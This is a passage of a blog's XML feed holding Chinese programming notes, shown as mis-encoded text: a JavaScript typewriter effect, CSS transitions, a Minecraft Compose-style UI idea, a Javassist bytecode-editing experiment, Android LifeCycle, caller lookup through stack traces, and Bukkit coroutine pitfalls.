punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åå°±å¯ä»¥ç›´æ¥åœ¨å¤–éƒ¨è°ƒç”¨await</p><p>è®©æˆ‘ä»¬çœ‹çœ‹è·¯å§çš„ä¼˜é›…ã®code</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> p <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span><span class="token keyword">const</span> content <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">å…ƒä¸°å…­å¹´åæœˆåäºŒæ—¥å¤œï¼Œè§£è¡£æ¬²ç¡ï¼Œæœˆè‰²å…¥æˆ·ï¼Œæ¬£ç„¶èµ·è¡Œã€‚å¿µæ— ä¸ä¸ºä¹è€…ï¼Œé‚è‡³æ‰¿å¤©å¯ºå¯»å¼ æ€€æ°‘ã€‚æ€€æ°‘äº¦æœªå¯ï¼Œç›¸ä¸æ­¥äºä¸­åº­ã€‚åº­ä¸‹å¦‚ç§¯æ°´ç©ºæ˜ï¼Œæ°´ä¸­è—»ã€è‡äº¤æ¨ªï¼Œç›–ç«¹æŸå½±ä¹Ÿã€‚ä½•å¤œæ— æœˆï¼Ÿä½•å¤„æ— ç«¹æŸï¼Ÿä½†å°‘é—²äººå¦‚å¾ä¸¤äººè€…è€³ã€‚</span><span class="token template-punctuation string">`</span></span><span class="token comment">// è¿™ä¸ªå‡½æ•°å¯ä»¥è¾¾åˆ°ç±»ä¼¼Javaåœ¨å­çº¿ç¨‹ä¸­è°ƒç”¨Thread.sleepçš„æ•ˆæœ</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token parameter">ms</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ms<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> content<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    p<span class="token punctuation">.</span>textContent <span class="token operator">=</span> content<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span>    <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™æ ·å†™å°±éå¸¸å½³äºäº†</p><h5 id="cssè‡ªå¸¦çš„åŠ¨ç”»"><a href="#cssè‡ªå¸¦çš„åŠ¨ç”»" class="headerlink" title="cssè‡ªå¸¦çš„åŠ¨ç”»"></a>cssè‡ªå¸¦çš„åŠ¨ç”»</h5><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">.circle</span> <span class="token punctuation">{</span>    <span class="token property">width</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>    <span class="token property">height</span><span class="token punctuation">:</span> 100px<span class="token punctuation">;</span>    <span class="token property">border-radius</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>    <span class="token property">transition</span><span class="token punctuation">:</span> all 1s<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">.circle.at-end</span> <span class="token punctuation">{</span>    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">translateX</span><span class="token punctuation">(</span>200px<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>transition: all 1s; è¢«åŠ ä¸Šäº†è¿™ä¸€æ¡ï¼Œä½ç½®çš„æ”¹å˜ä¼šæœ‰ä¸€ä¸ªä¸æ»‘çš„åŠ¨ç”»ï¼Œè€Œ1sè¿™ä¸ªå‚æ•°å†³å®šäº†ç§»åŠ¨çš„æ—¶é—´ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
            <tag> çŸ¥è¯†æ¢³ç† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€ä¸ªMinecraft Chest UIæ¡†æ¶çš„çµæ„Ÿ</title>
      <link href="/2022/09/03/a-idea-about-minecraft-ui/"/>
      <url>/2022/09/03/a-idea-about-minecraft-ui/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ä¸ªMinecraft-Chest-UIæ¡†æ¶çš„çµæ„Ÿ"><a href="#ä¸€ä¸ªMinecraft-Chest-UIæ¡†æ¶çš„çµæ„Ÿ" class="headerlink" title="ä¸€ä¸ªMinecraft Chest UIæ¡†æ¶çš„çµæ„Ÿ"></a>ä¸€ä¸ªMinecraft Chest UIæ¡†æ¶çš„çµæ„Ÿ</h1><p>æˆ‘åœ¨æƒ³ï¼ŒMinecraftçš„GUIï¼Œæ˜¯ä¸æ˜¯ä¹Ÿå¯ä»¥æ²¿ç”¨Composeçš„é‚£å¥—è®¾è®¡æ€è·¯â€¦</p><p>äºæ˜¯è¯´å¹²å°±å¹²ï¼Œæˆ‘ä¼šæ”¾ä¸€äº›æ€è·¯åœ¨ä¸‹é¢</p><h2 id="ä¸€äº›Minecraftæœ¬åœŸåŒ–æªæ–½"><a href="#ä¸€äº›Minecraftæœ¬åœŸåŒ–æªæ–½" class="headerlink" title="ä¸€äº›Minecraftæœ¬åœŸåŒ–æªæ–½"></a>ä¸€äº›Minecraftæœ¬åœŸåŒ–æªæ–½</h2><p>å½“ç„¶ä¸èƒ½ææ•™æ¡ä¸»ä¹‰ï¼Œæ¯•ç«ŸMinecraft GUIä¸Android UIä¹‹é—´å·®è·ä¸å¯è°“ä¸å¤§ï¼Œä¸å¯èƒ½ç…§æ¬ç…§æŠ„ã€‚</p><h3 id="å¤šå¹³å°å®ç°"><a href="#å¤šå¹³å°å®ç°" class="headerlink" title="å¤šå¹³å°å®ç°"></a>å¤šå¹³å°å®ç°</h3><p>MinecraftComposeæä¾›æ¥å£ä¾›å…¶ä»–å¼€å‘è€…å®ç°ï¼ŒåŒæ—¶æä¾›ä¸€å¥—åŸºäºTabooLibæ¡†æ¶ä¸‹çš„é»˜è®¤å®ç°</p><p>å¦‚æœä½ å¸Œæœ›åŸºäºå…¶ä»–UIæ¡†æ¶ä½¿ç”¨MinecraftComposeï¼Œå¯ä»¥è‡ªè¡Œå®ç°</p><h3 id="Composableå®ç°"><a href="#Composableå®ç°" class="headerlink" title="@Composableå®ç°"></a>@Composableå®ç°</h3><p>æˆ‘è®¤ä¸ºå¯¹æˆ‘æ¥è¯´æå‡º@Composableé‚£ç§æ•ˆæœæœ‰ç‚¹ä¸ç°å®ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¾¿é€€è€Œæ±‚å…¶æ¬¡ï¼Œä½¿ç”¨ä¸‹é¢çš„æ–¹å¼è¾¾åˆ°å‡½æ•°ç»„åˆçš„æ•ˆæœã€‚</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">val</span> composeApi <span class="token operator">=</span> MinecraftCompose<span class="token punctuation">.</span><span class="token function">newAPIInst</span><span class="token punctuation">(</span>TabooLibImpl<span class="token operator">::</span><span class="token keyword">class</span><span class="token punctuation">.</span>java<span class="token punctuation">)</span><span class="token comment">// ä¸ºç©å®¶æ‰“å¼€UI</span><span class="token keyword">fun</span> <span class="token function">openFor</span><span class="token punctuation">(</span>player<span class="token operator">:</span> Player<span class="token punctuation">)</span> <span class="token punctuation">{</span>    composeApi<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span>player<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">/**this: ComposeScope **/</span>        <span class="token function">mainUI</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">// Compose Function</span><span class="token keyword">fun</span> <span class="token function">mainUI</span><span class="token punctuation">(</span>scope<span class="token operator">:</span> ComposeScope<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">with</span><span class="token punctuation">(</span>scope<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// å‰©ä¸‹çš„ç•™ç€æˆ‘ä¹‹åæƒ³</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="MVIæ€æƒ³"><a href="#MVIæ€æƒ³" class="headerlink" title="MVIæ€æƒ³"></a>MVIæ€æƒ³</h3><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">val</span> state <span class="token keyword">by</span> viewModel<span class="token punctuation">.</span>databaseFlow<span class="token punctuation">.</span><span class="token function">observeAsState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">// ObserveAsStateå,ComposeUIä¼šéšè®¢é˜…çš„Flowæ›´æ–°è€Œé‡æ„</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Minecraft </tag>
            
            <tag> Compose </tag>
            
            <tag> Kotlin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆè¯•Javassist</title>
      <link href="/2021/11/07/try-javassist/"/>
      <url>/2021/11/07/try-javassist/</url>
      
        <content type="html"><![CDATA[<p>ä»Šå¤©çœ‹è§ç¾¤å‹åšäº†ä¸ªå¾ˆæœ‰æ„æ€çš„ä¸œè¥¿: æ‹¦æˆªæ’ä»¶çš„setOpæ–¹æ³•ï¼Œå½»åº•å¹²æ‰åé—¨æ’ä»¶</p><p>ç»è¿‡ä¸€ç•ªäº¤è°ˆä¹‹åï¼Œæˆ‘å¾—çŸ¥è¿™æ˜¯åˆ©ç”¨Javassiståšçš„ï¼Œåˆ©ç”¨javassistå°†setopæ–¹æ³•çš„å†…å®¹æ›¿æ¢ä¾¿å¯å®ç°ã€‚ä¹‹å‰ä¹Ÿåœ¨bç«™çœ‹åˆ°è¿‡æœ‰å¤§ä½¬ç”¨javassiståˆ©ç”¨Integerè£…ç®±çš„ç‰¹æ€§æ•´ç—…æ¯’æ³¨å…¥çš„éªšæ“ä½œâ€¦äºæ˜¯æˆ‘surf the internetï¼Œäº†è§£äº†ä¸€ä¸‹è¿™ä¸ªåº“çš„ç”¨æ³•ï¼Œå‘ç°å®ƒä¸asmåº“çš„ä½œç”¨ä¸æ˜¯ä¸€èˆ¬çš„ç›¸ä¼¼ã€‚ä½†å®ƒä¸åŒäºasmåº“çš„æ˜¯å®ƒçš„å¯æ“ä½œç©ºé—´æ˜¯æ²¡æœ‰asmåº“å¤§çš„ï¼Œä½†å®ƒçš„æ“ä½œä¼šç®€å•è®¸å¤šã€‚æˆ‘ä»¬ç”šè‡³ä¸éœ€è¦äº†è§£å­—èŠ‚ç ä¾¿èƒ½ä½¿ç”¨javassistå®ç°ä¸€äº›ä¿®æ”¹å­—èŠ‚ç çš„åŠŸèƒ½ã€‚</p><p>å®éªŒä»£ç </p><pre class="line-numbers language-none"><code class="language-none">fun main() {    javassistEdit()}fun javassistEdit() {    // è·å–ctClass,å› ä¸ºæ˜¯Kotlinæ–‡ä»¶æ‰€ä»¥å¸¦æœ‰Ktåç¼€    val ctClass = ClassPool.getDefault().get("kim.bifrost.coldrain.partice.TestClass")    // ä»ctClassè·å–æ–¹æ³•    val ctMethod = ctClass.getDeclaredMethod("test")    // ç›´æ¥ä¿®æ”¹æ–¹æ³•ä½“    ctMethod.setBody("{ System.out.println(\"ä¿®æ”¹è¿‡åçš„å†…å®¹\"); }")    // åœ¨æ–¹æ³•èµ·å§‹è¡Œæ’å…¥ä»£ç     ctMethod.insertBefore("""        System.out.println("ç¬¬ä¸€è¡Œ");        """)    // åœ¨æ–¹æ³•æœ€åä¸€è¡Œæ’å…¥ä»£ç     ctMethod.insertAfter("""        System.out.println("æœ€åä¸€è¡Œ");        """)    // é€šè¿‡cflowæ£€æŸ¥æ˜¯å¦ä¸ºé€’å½’è°ƒç”¨    ctMethod.useCflow("test")    // è‹¥ä¸ä¸ºé€’å½’è°ƒç”¨åˆ™æ‰“å°test    ctMethod.insertBefore("if ($"+ "cflow(test) == 0)" +            " System.out.println(\"test \");")    // å°†newInstanceè·å¾—çš„å®ä¾‹ç›´æ¥castæˆæ¥å£,é¿å…åå°„å¸¦æ¥çš„å¼€é”€    (ctClass.toClass().newInstance() as TestInterface).test()}class TestClass : TestInterface {    override fun test() {        println("æµ‹è¯•å†…å®¹1")    }}interface TestInterface {    fun test()}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¾“å‡ºç»“æœ:</p><pre class="line-numbers language-none"><code class="language-none">test ç¬¬ä¸€è¡Œä¿®æ”¹è¿‡åçš„å†…å®¹æœ€åä¸€è¡Œ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ä½†æˆ‘æœ‰äº›ç–‘æƒ‘çš„åœ°æ–¹åœ¨äºï¼Œè¦æ€ä¹ˆæ ·æ‰ç›´æ¥ä¿®æ”¹TestClassæœ¬èº«ï¼Œè®©ä¿®æ”¹ä»¥åè°ƒç”¨è¿™ä¸ªç±»æœ¬èº«çš„æ–¹æ³•ä¹Ÿæ˜¯ç»è¿‡æˆ‘ä»¬ä¿®æ”¹çš„æ–¹æ³•</p><p>è€Œä¸æ˜¯ç”¨æˆ‘ä»¬ä¿®æ”¹è¿‡çš„ctClasså®ä¾‹åŒ–å‡ºä¸€ä¸ªå®ä¾‹æ¥è°ƒç”¨å…¶ä¸­çš„æ–¹æ³•</p><p>æ¯•ç«Ÿï¼Œåªæœ‰è¿™æ ·æ‰èƒ½åšåˆ°é‚£ä½ç¾¤å‹çš„ â€œæŠŠsetOpæ–¹æ³•åˆ å¹²å‡€â€ çš„æ•ˆæœå‘¢</p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> Java </tag>
            
            <tag> å¤–éƒ¨åº“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®°è§‚å¯Ÿè€…æ¨¡å¼(Observer Pattern) &amp; Android LifeCycle</title>
      <link href="/2021/11/06/observe-pattern-and-android/"/>
      <url>/2021/11/06/observe-pattern-and-android/</url>
      
        <content type="html"><![CDATA[<p>å…¶å®ä»Šå¤©æˆ‘æ‰å¬è¯´è¿™ç§è®¾è®¡æ¨¡å¼ï¼ˆä¹‹å‰æŠŠè¿™ä¸ªè·Ÿvisitoræ¨¡å¼ææ··äº†ï¼‰ï¼Œä½†ä»¥å‰ä¸çŸ¥ä¸è§‰å·²ç»ç”¨è¿‡å¾ˆå¤šè¿™æ ·è®¾è®¡çš„apiäº†ã€‚</p><p>ä¸Šå‘¨çš„çº¢å²©ä½œä¸šç”šè‡³æ‰‹æ“äº†ä¸ªeventbusï¼ˆä¸è¿‡æ²¡æ“æˆæ³¨è§£é‚£ç§å½¢å¼ï¼Œä¸è¿‡ç¡®å®æ— æ„ä¸­ç”¨åˆ°äº†è§‚å¯Ÿè€…æ¨¡å¼çš„è®¾è®¡æ–¹å¼ï¼‰</p><p>æ„Ÿè§‰æœ€ç‰›é€¼çš„æ˜¯ï¼Œæˆ‘æ˜¯è‡ªå·±æ‚Ÿå‡ºè§‚å¯Ÿè€…æ¨¡å¼çš„è®¾è®¡æ–¹å¼å»å®ç°äº†eventbusï¼Œæ€è·¯ä¸è§‚å¯Ÿè€…æ¨¡å¼åˆ«æ— äºŒè‡´ã€‚ï¼ˆçªç„¶æ„Ÿè§‰è‡ªå·±ä¹Ÿè®¸æ²¡é‚£ä¹ˆåºŸç‰©ï¼‰</p><p>ä»Šå¤©è¿™ç¯‡åšæ–‡ä¸»è¦æ˜¯è®°å½•ä¸€ä¸‹Android Jetpackç»„ä»¶LifeCycleçš„ç”¨æ³•æ</p><h2 id="LifeCycle"><a href="#LifeCycle" class="headerlink" title="LifeCycle"></a>LifeCycle</h2><p>ä¸TabooLibé‡Œçš„Awakeæ³¨è§£æ¯”è¾ƒç±»ä¼¼ï¼Œè®©æˆ‘ä»¬ä¸ç”¨æŠŠæ¯ä¸ªç»„ä»¶ç”Ÿå‘½å‘¨æœŸéœ€è¦æ‰§è¡Œçš„ä»£ç éƒ½å†™åœ¨MainActivity ï¼ˆ</p><p>æœ‰åŠ©äºé™ä½ä»£ç è€¦åˆåº¦</p><p>åŒæ—¶å®ƒä¹Ÿä½¿ç”¨äº†è§‚å¯Ÿè€…æ¨¡å¼çš„è®¾è®¡æ¨¡å¼XD</p><p>è‰ï¼Œä¸æƒ³å†™äº†ï¼Œå°±è¿™æ ·å§</p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> Android </tag>
            
            <tag> è®¾è®¡æ¨¡å¼ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java/kotlin æ–¹æ³•ä¸­è·å¾—è°ƒç”¨æ–¹çš„ç±»ä¸æ–¹æ³•å</title>
      <link href="/2021/11/03/get-stacktrace-method-path/"/>
      <url>/2021/11/03/get-stacktrace-method-path/</url>
      
        <content type="html"><![CDATA[<p>è¿™ä¹Ÿæ˜¯æˆ‘ä¸€ç›´å¾ˆæ„Ÿå…´è¶£çš„ä¸€ä¸ªé—®é¢˜ã€‚æ›¾ç»åœ¨ç¿»é˜…TabooLib5æºç æ—¶å‘ç°è¿‡ç±»ä¼¼çš„åŠŸèƒ½ï¼ŒTabooLib5åˆ©ç”¨å®ƒæ¥å¾—åˆ°è°ƒç”¨æ–¹æ³•çš„æ’ä»¶å®ä¾‹ã€‚</p><p>ä»Šå¤©åœ¨ç½‘ä¸Šå†²æµªçš„æ—¶å€™ææ˜ç™½äº†ï¼Œä¾¿æ¥å†™ä¸€ç¯‡åšæ–‡ã€‚</p><h2 id="ä»æ ˆä¸­è·å–"><a href="#ä»æ ˆä¸­è·å–" class="headerlink" title="ä»æ ˆä¸­è·å–"></a>ä»æ ˆä¸­è·å–</h2><p>åœ¨æ–¹æ³•è°ƒç”¨ä¸­newä¸€ä¸ªThrowableå®ä¾‹ï¼Œå¾—åˆ°å®ƒçš„stackTraceï¼ˆstackTraceElementæ•°ç»„ï¼‰ï¼Œä¾¿å¯ä»¥æå–å‡ºä¸€æ¡å®Œæ•´çš„æ–¹æ³•è°ƒç”¨é“¾ã€‚</p><p>åŒç†ï¼Œåœ¨try catchæŠ“æŠ¥é”™çš„æ—¶å€™ï¼ŒæŠ“åˆ°çš„æŠ¥é”™ä¹Ÿå¯ä»¥é€šè¿‡è·å–stackTraceæ¥æå–ä¸€æ¡æ–¹æ³•è°ƒç”¨é“¾ã€‚</p><p>åœ¨å†™ä¸€ä¸ªExceptionçš„æ—¶å€™ï¼Œä½ ç”šè‡³å¯ä»¥é‡å†™å®ƒçš„printStackTraceæ–¹æ³•è®©å®ƒçš„æŠ¥é”™æ›´å¥½çœ‹ ï¼ˆ</p><p><strong>ä¾‹å­</strong></p><p>Parctice.kt</p><pre class="line-numbers language-none"><code class="language-none">package kim.bifrost.coldrain.partice/** * kim.bifrost.coldrain.partice.Partice * Partice * * @author å¯’é›¨ * @since 2021/11/3 16:45 **/fun main() {    test()}fun test() {    // è·å–ä¸Šä¸€çº§è°ƒç”¨è€…    val info = Throwable().stackTrace.run {        get(size - 2)    }    println("class: ${info.className} method: ${info.methodName}")}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç¼–è¯‘åè¿è¡Œç»“æœä¸º</p><pre class="line-numbers language-none"><code class="language-none">class: kim.bifrost.coldrain.partice.ParticeKt method: main<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="è·å–å…¶ä»–çº¿ç¨‹çš„æ ˆ"><a href="#è·å–å…¶ä»–çº¿ç¨‹çš„æ ˆ" class="headerlink" title="è·å–å…¶ä»–çº¿ç¨‹çš„æ ˆ"></a>è·å–å…¶ä»–çº¿ç¨‹çš„æ ˆ</h3><p>è°ƒç”¨Thread#getStackTrace()</p><p>è¯¥æ–¹æ³•ä¸å»ºè®®åœ¨å½“å‰çº¿ç¨‹è°ƒç”¨ï¼ŒThrowable#getStackTrace()ä¼˜äºè¯¥æ–¹æ³•</p><p>ç†ç”±è§Log4jæ³¨é‡Š<a href="https://github.com/apache/logging-log4j2/blob/20f9a97dbe5928c3b5077bcdd2a22ac92e941655/log4j-api/src/main/java/org/apache/logging/log4j/util/StackLocator.java">https://github.com/apache/loggin â€¦ l/StackLocator.java</a></p><h2 id="JDK8åå¼ƒç”¨çš„Reflection-getCallerClassæ–¹æ³•"><a href="#JDK8åå¼ƒç”¨çš„Reflection-getCallerClassæ–¹æ³•" class="headerlink" title="JDK8åå¼ƒç”¨çš„Reflection.getCallerClassæ–¹æ³•"></a>JDK8åå¼ƒç”¨çš„Reflection.getCallerClassæ–¹æ³•</h2><p>sun.reflect.Reflection.getCallerClass()</p><p>ä½†ä¸å»ºè®®ä½¿ç”¨ï¼ŒJDK8ä»¥åè¯¥å†…éƒ¨apiå·²ç»è¢«åˆ é™¤</p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ•´ç†ä¸€ä¸‹ä»Šå¤©è¸©çš„å‘</title>
      <link href="/2021/10/31/some-tips/"/>
      <url>/2021/10/31/some-tips/</url>
      
        <content type="html"><![CDATA[<h2 id="å…¶ä¸€"><a href="#å…¶ä¸€" class="headerlink" title="å…¶ä¸€"></a>å…¶ä¸€</h2><p>ä»Šå¤©å°è¯•ç”¨Kotlinå§”æ‰˜å°†ä¸€ä¸ªç©å®¶Inventoryçš„æ‰€æœ‰æ–¹æ³•å…¨éƒ¨å§”æ‰˜ç»™äº†æˆ‘å†™çš„ä¸€ä¸ªCookingInventoryç±»</p><p><a href="https://camo.githubusercontent.com/55bf43db7aba95bd5ace9c7366cc2ec8e23b8ef3933ecffb5b51287fab56b7c4/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f636f6465312e706e67"><img src="https://camo.githubusercontent.com/55bf43db7aba95bd5ace9c7366cc2ec8e23b8ef3933ecffb5b51287fab56b7c4/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f636f6465312e706e67" alt="code1"></a></p><p>ç„¶åæˆ‘å°è¯•ç”¨ç©å®¶çš„openInventoryæ‰“å¼€ä¸€ä¸ªCookingInventoryå®ä¾‹ï¼Œå‘ç°æŠ¥äº†è¿™æ ·ä¸€ä¸ªé”™</p><p><a href="https://camo.githubusercontent.com/7f2c69bf1260d9b8abac702d8bc11bd43a88ffcb60667faceb3e1eb57c7b6215/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f6c6f67312e706e67"><img src="https://camo.githubusercontent.com/7f2c69bf1260d9b8abac702d8bc11bd43a88ffcb60667faceb3e1eb57c7b6215/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f6c6f67312e706e67" alt="log1"></a></p><p>åŸæ¥openInventoryæ–¹æ³•çš„å®ç°æ˜¯å¯¹CraftInventoryç±»å‹å®ä¾‹çš„æ“ä½œï¼Œè€Œä¸æ˜¯å¯¹ä¸€ä¸ªInventoryå®ä¾‹çš„æ“ä½œï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘éœ€è¦ä¼ å…¥openInventoryæ–¹æ³•çš„å‚æ•°ä¸æ­¢åº”è¯¥å®ç°Inventoryæ¥å£ï¼Œè¿˜åº”è¯¥æ˜¯ä¸€ä¸ªCraftInventoryç±»å‹çš„å®ä¾‹</p><p>æ‰€ä»¥ç”¨å§”æ‰˜æ¥å®ç°Inventoryæ¥å£çš„ç±»å®ä¾‹åŒ–å¾—åˆ°çš„å®ä¾‹è‡ªç„¶æ˜¯æ²¡åŠæ³•ç”¨è¿™ä¸ªæ–¹æ³•opençš„</p><h2 id="å…¶äºŒ"><a href="#å…¶äºŒ" class="headerlink" title="å…¶äºŒ"></a>å…¶äºŒ</h2><p>ä»Šå¤©å°è¯•åœ¨åç¨‹ä¸­æ‰“å¼€ç©å®¶UIç•Œé¢ï¼Œå´å‘ç°æŠ¥äº†ä¸ªéå¸¸ç†Ÿæ‚‰çš„é”™</p><p><a href="https://camo.githubusercontent.com/726d3f1aca9a78f563c95d2ded12860d7e39c4cf5483ec591ca82bce2d514a11/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f6c6f67322e706e67"><img src="https://camo.githubusercontent.com/726d3f1aca9a78f563c95d2ded12860d7e39c4cf5483ec591ca82bce2d514a11/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f6c6f67322e706e67" alt="log2"></a></p><p>ä½†åç¨‹ä¸æ˜¯åŒæ­¥çš„å—ï¼Ÿæˆ‘æ‰å­¦äº†åç¨‹æ˜¯å¹¶å‘ï¼Œè€Œå¹¶éå¹¶è¡Œã€‚éš¾é“åŒä¸€çº¿ç¨‹ä¸Šçš„å¹¶å‘æ“ä½œä¹Ÿèƒ½è¢«ç§°ä¹‹ä¸ºå¼‚æ­¥å—ï¼Ÿ</p><p>ä¹‹åæˆ‘å‘ç°ï¼Œæˆ‘è°ƒç”¨åç¨‹æ–¹æ³•æ—¶ï¼Œæ— è®ºæˆ‘æ˜¯ä¸æ˜¯asyncï¼Œä»–ä»¬éƒ½æ˜¯åœ¨å¦å¤–ä¸€æ¡çº¿ç¨‹ä¸Šæ‰§è¡Œçš„ï¼Œè€Œå¹¶éåœ¨Bukkitçš„ä¸»çº¿ç¨‹ä¸Šæ‰§è¡Œã€‚</p><p>githubä¸Šæœ‰ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„åº“ - MCCoroutineï¼Œèƒ½è®©MCæ’ä»¶å¼€å‘çš„å¤§éƒ¨åˆ†æ“ä½œéƒ½èƒ½åœ¨åç¨‹ä¸Šæ‰§è¡Œï¼Œè€Œä¸”å®ç°åŸç†æ®è¯´è›®ç®€å•ï¼Œä¸‹æ¬¡è¯•è¯•èƒ½ä¸èƒ½æŠ„è¿‡æ¥ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> Coroutine </tag>
            
            <tag> Bukkit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git Commit è§„èŒƒ</title>
      <link href="/2021/10/28/git-commit-rule/"/>
      <url>/2021/10/28/git-commit-rule/</url>
      
